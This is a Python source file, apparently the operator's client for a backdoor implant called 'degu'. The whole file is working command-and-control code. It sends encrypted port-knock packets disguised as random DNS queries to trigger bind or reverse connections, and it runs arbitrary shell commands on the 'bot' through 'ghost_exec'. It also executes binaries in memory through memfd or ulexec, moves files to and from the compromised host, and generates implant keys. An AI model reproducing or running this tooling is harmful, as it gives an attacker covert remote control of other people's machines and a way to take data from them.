#!/usr/bin/env python3

import socket
import ctypes
import logging
import binascii
import os
import time
import struct
import threading
import random
import string
import sys


DEGU="../degu.so"
DEGU_EXE_UL     = b"<o)~"
DEGU_EXE_MEMFD  = b"<o):"
DEGU_DL         = b"Oo<<"
DEGU_UP         = b"Oo>>"

def mock_dns():
    """generate random dns query for degu knock

    Returns:
        byte: first 32 bytes of DNS query header
    """    
    
    names = ["google.com","youtube.com","facebook.com","wikipedia.org","yahoo.com","amazon.com",
    "twitter.com","live.com","instagram.com","reddit.com","linkedin.com","blogspot.com","netflix.com",
    "twitch.tv","whatsapp.com","microsoft.com","bing.com","ebay.com","github.com","stackoverflow.com",
    "office.com","msn.com","paypal.com","imgur.com","wordpress.com","apple.com","dropbox.com",
    "tumblr.com","bbc.com","force.com","salesforce.com","roblox.com","spotify.com","soundcloud.com",
    "discordapp.com","medium.com","mediafire.com","godaddy.com","etsy.com","duckduckgo.com",
    "slack.com","dailymotion.com","speedtest.net","blogger.com"]

    transac_id = struct.pack("H",random.randint(0,65535))
    flags = b"\x01\x00\x00\x01\x00\x00\x00\x00\x00"
    name = random.choice(names)
    len_name = struct.pack(">H",len(name))
    rest = b"\x00\x01\x00\x01"
    dns_data = transac_id + flags + len_name + name.encode() + rest + 32*b"\x00"
    return dns_data[:32]


def create_bin_string(bin :bytes, args :bytes, memfd :bool = False ):
    """ create payload for memory execution

    Args:
        bin (byte): binary to send
        args (byte[]): argument to binary don't forget args[0] for exe name
        memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

    Returns:
        byte: unencrypted byte stream to send
    """ 
    mybin = open(bin ,"rb").read()
    lbin = struct.pack("I",len(mybin))
    argc = struct.pack("B",len(args.split()))
    largs = struct.pack("I",len(args))
    payload=b""
    if memfd:
        payload += DEGU_EXE_MEMFD
    else:
        payload += DEGU_EXE_UL

    payload += lbin + largs + argc + args + mybin
    size = len(payload)
    delta = 32 - (size % 32)
    data = payload + delta * b"\0"
    return data

def create_dl_string(path :bytes):
    """create payload for file download

    Args:
        path (byte): file path on server to download

    Returns:
        byte: unencrypted byte stream to send
    """    
    lpath = struct.pack("I",len(path))
    payload = DEGU_DL + lpath + path
    size = len(payload)
    delta = 32 - (size % 32)
    data = payload + delta * b"\0"
    return data

def create_up_string(path:bytes,file:bytes):
    """create payload for file upload

    Args:
        path (byte): path to upload to
        file (byte): local file to read

    Returns:
        byte: unencrypted byte stream to send
    """    
    lpath = struct.pack("I",len(path))
    data = None
    try:
        data = open(file,"rb").read()
    except FileNotFoundError:
        # XXX 
        return None
    ldata = struct.pack("I",len(data))
    payload = DEGU_UP + ldata + lpath + path + data
    size = len(payload)
    delta = 32 - (size % 32)
    data = payload + delta * b"\0"
    return data

class degu(object):
    def __init__(self,host,priv,kport=53,lib=DEGU):
        """main degu object

        Args:
            host (str): ip addr or hostname of degu server
            priv (str): hex stream of private data key (01020304....)
            kport (int): custom knock port for non root degu . Defaults to 53 for root usage.
            lib (str, optional): degu.so library location . Defaults to DEGU global variable.
        """        
        self.priv = binascii.unhexlify(priv)
        self.lib = lib
        self.log = logging.getLogger(__name__)
        try:
            os.putenv("_LC","1")
            self.lib =  ctypes.CDLL(self.lib)
        except OSError:
            self.log.error("no degu lib found")
            sys.exit(-1)
        self.host = host
        self.kport = kport
        self.bot_pubkey = None
        self.s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    def xbuf(self,data):
        """encrypt/decrypt data with session context

        Args:
            data (byte): data to cipher with current aes context

        Returns:
            byte: ciphered data
        """        
        if not data:
            return None
        self.lib.xbuf(self.bot_pubkey,self.priv,data,len(data))
        return data

    def xcrypt_knock(self,data):
        """encrypt knock data with knock key

        Args:
            data (byte): knock to cipher/decipher

        Returns:
            byte: ciphered/deciphered data
        """        
        
        self.lib.xnock(data,len(data))
        return data

    def sign_msg(self,data):
        """get data signature

        Args:
            data (byte): data to sign

        Returns:
            byte: signature
        """        
        sig = ctypes.create_string_buffer(64)
        self.lib.xsig(sig,data,len(data),self.priv)
        return sig.raw

    def mkbuf_knock(self,addr):
        """make knock message

        Args:
            addr (byte): target host

        Returns:
            byte: ciphered knock buffer with DNS header
        """        

        buf_rand = mock_dns()
        self.xcrypt_knock(buf_rand)
        self.log.debug("knocking %s"%addr)
        payload = None
        if addr.startswith(b":"):
            try:
                port = int(addr[1:])
                self.port = port
                self.log.debug("trying remote bind on %s:%i"%(self.host,port))
                f = struct.pack("H",port)
                payload = buf_rand + b"\xb0\x0b" + f + b"\0"*1000
            except ValueError:
                self.log.error(f"Port {addr[1:]} is invalid")
        else:
            try:
                sip,sport = addr.split(b":")
                self.log.debug(f"trying backconnect on {sip}:{sport}")
                ip = bytes(map(int, sip.split(b'.')))
                port = int(sport)
                f = struct.pack("H",port)
                payload = buf_rand + b"\xc4\x11" + ip + f + b"\0"*1000
            except Exception as exc:
                self.log.error("addr %s is invalid : %s"%(addr,exc))
                return None
        if payload:
            return self.xcrypt_knock( payload )
        return None

    def mkbuf_upload( self, file , path, pub ):
        """make upload buffer

        Args:
            file (byte): local filename to read
            path (byte): remote path to use for upload
            pub (byte): public key of degu instance

        Returns:
            byte: ciphered upload data command
        """        

        if not self.bot_pubkey :
            self.bot_pubkey = self.xcrypt_knock( pub )
        data = create_up_string( path , file )
        return self.xbuf( data )
        
    def mkbuf_mem_exec(self, bin, param, pub, memfd=False):
        """make memexec buffer

        Args:
            bin (byte): binary to send
            param (byte[]): arguments to binary don't forget args[0] for exe name
            pub (byte): public key of degu instance
            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

        Returns:
            byte: encrypted byte buffer to send

        """        
    
        if not self.bot_pubkey :
            self.bot_pubkey = self.xcrypt_knock( pub )
        data = create_bin_string( bin, param, memfd=memfd )
        return self.xbuf( data )

    def mkbuf_download(self,path,pub):
        """ make download buffer

        Args:
            path (byte): file path on server to download
            pub (byte): public key of degu instance

        Returns:
            byte: encrypted byte buffer to send
        """
        if not self.bot_pubkey :            
            self.bot_pubkey = self.xcrypt_knock(pub) ## here for user !!!!
        data = create_dl_string( path )
        return self.xbuf(data)

    def mkbuf_ghost_exec(self,mycmd):
        """make ghost exec buffer

        Args:
            mycmd (byte): raw shell command

        Returns:
            byte: encrypted byte buffer to send
        """        

        rand = mock_dns()
        self.xcrypt_knock(rand)
        sig  = self.sign_msg(mycmd)
        payload = rand + b"\xc0\x57" + struct.pack("H",len(mycmd)) +  mycmd + sig + b'\x00'*1000
        return self.xcrypt_knock(payload)

    def rdownload(self,path,lport,timeout=5):
        """ reverse connect download file from bot to client

        Args:
            path (byte): file path on server to download
            lport (int): local port to listen to
            timeout (int, optional): timeout to file receive. Defaults to 5.

        Returns:
            byte: contents of file or None if error
        """        

        self.log.info(f"CB downloading {path.decode()}")
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            serv.bind(('0.0.0.0', int(lport)))
        except PermissionError as e :
            self.log.error(f"unable to bind on {int(lport)}: {e}")
            return None
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        pub = s.recv(32)
        data = self.mkbuf_download(path,pub)
        s.send(data)
        recvdata = b""
        while 1:
            tmp = s.recv(4096)
            if tmp :
                recvdata += tmp
            else :
                break
        if len(recvdata) > 4:
            self.xbuf(recvdata)
            lmsg = struct.unpack(">I",recvdata[:4])[0]
            s.close()
            return recvdata[4:lmsg+4]
        else:
            self.log.error("no recv :(")
        s.close()
        return None

    def download(self, path ):
        """ bind connect download file from bot to client

        Args:
            path (byte): file path on server to download

        Returns:
            byte: contents of file or None if error
        """        
        
        self.log.info(f"Downloading {path.decode()}")
        s = socket.socket()
        try:
            s.connect((self.host,self.port))
        except ConnectionRefusedError as e:
            self.log.error(f"Unable to connect to {self.host}:{self.port} : {e}")
            return None
        except socket.gaierror as e:
            self.log.error(f"Unable to resolv {self.host} : {e}")
            return None

        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_download(path,pub)
        s.send(data)
        recvdata = b""
        while 1:
            tmp = s.recv(4096)
            if tmp :
                recvdata += tmp
            else :
                break
        if len(recvdata) > 4:
            self.xbuf(recvdata)
            lmsg = struct.unpack(">I",recvdata[:4])[0]
            s.close()
            return recvdata[4:lmsg+4]
        else:
            self.log.error("no recv :(")
        s.close()
        return None

    def upload(self, file , path ):
        """bind connect upload file from client to bot

        Args:
            file (byte): local filename to read
            path (byte): remote path to use for upload
        Returns:
            int: len of uploaded data or None
        """        
        self.log.info(f"Uploading {file.decode()} {path.decode()}")
        s = socket.socket()
        try:
            s.connect((self.host,self.port))
        except ConnectionRefusedError as e:
            self.log.error(f"Unable to connect to {self.host}:{self.port} : {e}")
            return None
        except socket.gaierror as e:
            self.log.error(f"Unable to resolv {self.host} : {e}")
            return None
        
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_upload(file, path, pub)
        if not data :
            return None
        ret = s.send(data)
        s.close()
        return ret

    def rupload(self, file , path, lport, timeout=5 ):
        """ reverse connect upload file from client to bot

        Args:
            file (byte): local filename to read
            path (byte): remote path to use for upload
            lport (int): local port to listen to
            timeout (int, optional): timeout to file send. Defaults to 5.

        Returns:
            int: len of uploaded data or None
        """        

        self.log.info(f"cb Uploading {file.decode()} {path.decode()}")
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            serv.bind(('0.0.0.0', int(lport)))
        except PermissionError as e :
            self.log.error(f"unable to bind on {int(lport)}: {e}")
            return None
        
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_upload(file, path, pub)
        if not data :
            return None
        ret = s.send(data)
        s.close()
        return ret

    def helper(self, bin, param, memfd=False):
        """ bind connect execute binary in memory and return socket for reuse

        Args:
            bin (byte): helper binary to use
            param (byte[]): arguments to binary don't forget args[0] for exe name
            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

        Returns:
            socket: socket object from degu session
        """        
        self.log.info("Sending bin %s params '%s' "%(bin,param.decode()))
        s = socket.socket()
        s.connect((self.host,self.port))
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin, param, pub, memfd=memfd)
        s.send(data)
        return s

    def rhelper(self, bin, param, lport, timeout=5, memfd=False):
        """ reverse connect execute binary in memory and return socket for reuse

        Args:
            bin (byte): helper binary to use
            param (byte[]): arguments to binary don't forget args[0] for exe name
            lport (int): local port to listen to
            timeout (int, optional): timeout to file send. Defaults to 5.
            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

        Returns:
            socket: socket object from degu session
        """
        self.log.info("Sending bin %s params '%s' "%(bin,param.decode()))
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serv.bind(('0.0.0.0', int(lport)))
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin, param, pub,memfd=memfd)
        s.send(data)
        return s

    def mem_exec(self, bin, param):
        """ bind connect execute binary in memory and close socket

        Args:
            bin (byte): executable binary to use
            param (byte[]): arguments to binary don't forget args[0] for exe name
        """        

        self.log.info("Sending bin %s params '%s' "%(bin,param.decode()))
        s = socket.socket()
        s.connect((self.host,self.port))
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin, param, pub)
        s.send(data)
        s.close()

    def rmem_exec(self, bin, param, lport, timeout=5):
        """ reverse connect execute binary in memory and close socket

        Args:
            bin (byte): executable binary to use
            param (byte[]): arguments to binary don't forget args[0] for exe name
            lport (int): local port to listen to
            timeout (int, optional): timeout to file send. Defaults to 5.
        """
        self.log.info("Sending bin %s params '%s' "%(bin, param.decode()))
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serv.bind(('0.0.0.0', int(lport)))
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin, param, pub)
        s.send(data)
        s.close()

    def knock(self,data:bytes):
        """ send knock to bot

        Args:
            data (byte): knock message ip:port for cb or just :port for bind

        Returns:
            bool: True is knock is send False otherwise
        """        
        buf = self.mkbuf_knock(data)
        if not buf:
            return
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        try:
            s.sendto(buf,0,(self.host,self.kport))
            return True
        except socket.gaierror as e:
            self.log.error(f"unable to resolv no knocking {self.host} : {e}")
            return False
        s.close()

    def ghost_exec(self, mycmd):
        """ execute system() command on bot, limited cmd to 1300 char no return

        Args:
            mycmd (byte): shell command
        """        

        self.log.info(f"ghost executing {mycmd}")
        buf = self.mkbuf_ghost_exec(mycmd)
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        self.log.debug("executing : %s"%mycmd)
        s.sendto(buf,0,(self.host,self.kport))
        s.close()

    def __str__(self):
        return f"<DEGU ({self.host})>"

    def __repr__(self):
        return f"<DEGU ({self.host})>"

    @staticmethod
    def getpub():
        """ get degu internal info """
        lib = ctypes.CDLL(DEGU)
        lib.xpub()

    @staticmethod
    def keygen():
        """ degu keygen function """
        file = '/tmp/.' + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
        lib =  ctypes.CDLL(DEGU)
        lib.keygen(file.encode())
        toexec = open(file,"rb").read()
        exec( toexec, globals() )
        os.unlink(file)
        tiv  = ["0x%02x"%c for c in binascii.unhexlify(iv)]
        tkno = ["0x%02x"%c for c in binascii.unhexlify(knock)]
        tpub = ["0x%02x"%c for c in binascii.unhexlify(pub)]
        ret  = "#define IV            { " + ",".join(tiv) + "}\n"
        ret += "#define KNOCK_KEY     { " + ",".join(tkno) + "}\n"
        ret += "#define MASTER_PUBKEY { " + ",".join(tpub) + "}\n"
        ret += f'\n// PRIVATE_KEY="{priv}"\n'
        return ret
